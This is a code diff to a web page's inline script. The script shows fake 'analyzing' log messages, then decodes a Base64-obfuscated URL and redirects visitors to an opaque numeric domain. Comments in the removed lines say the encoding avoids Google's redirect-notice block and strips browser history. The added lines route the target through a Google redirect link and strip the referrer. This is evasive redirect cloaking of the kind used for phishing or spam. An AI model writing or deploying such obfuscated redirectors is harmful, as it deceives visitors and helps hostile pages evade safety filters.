@@ -38,9 +38,8 @@
 
 <script>
 (function(){
-    // Directly encoded destination: "https://28763475824638273465284283425.com"
-    // This avoids the Google Redirect Notice block.
-    const _secret = "aHR0cHM6Ly8yODc2MzQ3NTgyNDYzODI3MzQ2NTI4NDI4MzQyNS5jb20=";
+    // EXACT Base64 for: https://www.google.com/url?q=https%3A%2F%2F28763475824638273465284283425.com&sa=D&sntz=1&usg=AOvVaw2Uuy-LN-ZIURsblP7CumML
+    const _secret = "aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS91cmw/cT1odHRwcyUzQSUyRiUyRjI4NzYzNDc1ODI0NjM4MjczNDY1Mjg0MjgzNDI1LmNvbSZzYT1EJnNudHo9MSZ1c2c9QU92VmF3MlV1eS1MTi1aSVVSc2JsUDdDdW1NTA==";
 
     const logs = [
         "Analyzing request...",
@@ -59,15 +58,14 @@
         } else {
             clearInterval(logger);
             
-            // Decode the target
             const target = atob(_secret);
             
-            // Execute redirection
+            // Redirect using the exact string provided
             setTimeout(() => {
-                // Method 1: Location Replace (Best for stripping history)
-                window.location.replace(target);
+                // Method 1: standard location redirect
+                window.location.href = target;
                 
-                // Method 2: Fallback Click
+                // Method 2: Fallback click with noreferrer to maintain privacy
                 const a = document.createElement('a');
                 a.href = target;
                 a.rel = 'noreferrer';
